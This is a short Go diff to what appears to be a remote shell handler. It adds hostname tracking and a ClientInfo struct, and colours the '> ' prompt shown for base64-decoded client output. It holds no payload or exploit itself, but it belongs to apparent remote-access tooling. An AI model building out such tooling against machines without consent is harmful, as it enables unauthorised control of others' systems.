@@ -14,10 +14,20 @@ type Client struct {
 	clientType string
 	os         string
 	osFlavor   string
+	hostname   string
 	isEncoded  bool
 	isDead     bool
 	conn       net.Conn
 	listener   net.Listener
+}
+
+type ClientInfo struct {
+	lanIP      string
+	clientType string
+	os         string
+	osFlavor   string
+	hostname   string
+	isEncoded  bool
 }
 
 func clientDisconnect(client Client) {
@@ -58,7 +68,7 @@ func runReadClient(client Client) {
 				return
 			}
 			buf = b64_decode(buf)
-			fmt.Print(buf + "> ")
+			fmt.Print(buf + colors.green + "> " + colors.reset)
 		} else {
 			buf := make([]byte, 65535)
 			_, err := conn.Read(buf)
